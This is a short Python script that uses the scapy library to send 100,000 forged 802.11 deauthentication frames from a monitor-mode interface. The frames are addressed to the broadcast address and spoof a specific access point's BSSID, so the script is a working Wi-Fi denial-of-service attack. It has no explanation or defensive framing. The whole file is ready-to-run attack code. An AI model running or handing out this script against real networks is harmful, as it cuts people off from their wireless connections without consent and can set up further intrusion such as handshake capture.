from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def deauth(target, bssid):
  dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
  frame = RadioTap()/dot11/Dot11Deauth()
  sendp(frame, iface="wlan0mon", count=100000, inter=0.90)
  pass


deauth(target="ff:ff:ff:ff:ff:ff" , bssid="6c:6f:26:96:57:3d")